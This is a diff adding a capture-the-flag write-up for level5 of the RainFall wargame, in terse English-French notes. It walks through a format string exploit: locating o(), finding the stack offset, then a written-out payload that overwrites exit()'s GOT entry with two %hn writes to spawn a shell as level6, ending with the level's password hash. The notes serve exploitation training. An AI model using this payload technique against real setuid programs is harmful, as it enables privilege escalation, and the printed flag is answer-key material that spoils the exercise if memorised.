@@ -1,0 +1,43 @@
+level5@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
+
+Function waits for an input then print it
+We want to call o() function which makes a bin/sh system call
+
+Addr of o(): objdump -t level5 | grep o
+080484a4 g     F .text	0000001e              o
+
+Start of our input is the 4th argument in the stack:
+level5@RainFall:~$ echo "AAAA.%4\$x" > /tmp/c 
+level5@RainFall:~$ cat /tmp/c - | ./level5 
+AAAA.41414141
+
+Objective: use the printf to call o()
+To do this we must write the number equivalent to o() address
+to replace exit() address in the Global Offset Table
+(the program will think it's calling exit() but the actual addr will
+be o()'s one)
+
+exit() address: 0x08049838 (objdump -R)
+
+o() address: 0x080484a4  == 134513828 it's too much
+So we'll split the address in 2 parts (High = 0x0804 / Low = 0x84a4)
+
+Payload: [High addr][Low addr][%(0x0804 = 2052) - 8 = 2044 x][%4\$hn][%(0x84a4 = 33956) - 2052 = 31904 x][%5\$hn]
+
+
+Explication:
+- \x3a\x98\x04\x08 : High address of exit in GOT
+- \x38\x98\x04\x08 : Low address of exit GOT
+- %2044x : write 2044 char ( + 8 char of addr ) to have 2052
+- %4\$hn : assign 2052 to the 4th element in the stack (beginning of buffer = exit() addr in GOT), store it in 2 octets bc of hn
+- %31904x : write 31904 char ( + 2052 char bf) to have 33956
+- %5\$hn : assign 33956 to the 5th ele in the stack (2e memory addr memoire of buffer), stores it in 2 octets bc of hn
+
+level5@RainFall:~$ echo -e "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn" > /tmp/c
+level5@RainFall:~$ cat /tmp/c - | ./level5 
+[ espaces ]
+cd ../level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
